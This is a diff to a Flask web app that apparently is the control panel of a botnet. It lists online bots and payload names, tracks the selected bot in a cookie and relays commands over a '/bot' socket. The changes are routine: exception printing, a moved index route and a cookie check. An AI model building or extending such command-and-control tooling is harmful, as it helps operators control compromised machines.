@@ -130,7 +130,8 @@ def invite():
                 mail.send(msg)
                 flask.flash('Message sent!')
                 return flask.redirect(flask.url_for('index'))
-            except:
+            except Exception as e:
+                print(e)
                 manual_mail = {'addr': email_addr, 'subject': subject, 'body': email_message}
     return flask.render_template('invite.html', error=error, manual_mail=manual_mail)
 
@@ -325,24 +326,6 @@ def setbot():
         resp.set_cookie('bot', request.form.get('bot'))
     return resp
 
-
-@app.route('/index')
-@app.route('/')
-@login_required
-def index():
-    connected = ''
-    if 'bot' in request.cookies:
-        connected = request.cookies.get('bot')
-    resp = flask.make_response(flask.render_template('index.html',
-                                                     async_mode=socketio.async_mode,
-                                                     bot_list=botnet.getOnlineConnections(),
-                                                     payload_list=botnet.getPayloadNames(),
-                                                     connected=connected))
-    if request.method == 'POST':
-        resp.set_cookie('bot', request.form.get('bot'))
-    return resp
-
-
 @app.route('/log', methods=['POST'])
 @login_required
 def resend_log():
@@ -365,6 +348,30 @@ def finder():
         connected = request.cookies.get('bot')
     return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getOnlineConnections(),
                                  connected=connected)
+
+
+@app.route('/index')
+@app.route('/')
+@login_required
+def index():
+    connected = ''
+    if 'bot' in request.cookies:
+        bot = request.cookies.get('bot')
+        if botnet.hasConnection(bot):
+            connected = request.cookies.get('bot')
+    resp = flask.make_response(flask.render_template('index.html',
+                                                     async_mode=socketio.async_mode,
+                                                     bot_list=botnet.getOnlineConnections(),
+                                                     payload_list=botnet.getPayloadNames(),
+                                                     connected=connected))
+    if 'bot' in request.cookies:
+        bot = request.cookies.get('bot')
+        if not botnet.hasConnection(bot):
+            resp.set_cookie('bot','')
+
+    if request.method == 'POST':
+        resp.set_cookie('bot', request.form.get('bot'))
+    return resp
 
 
 @socketio.on('send_command', namespace='/bot')
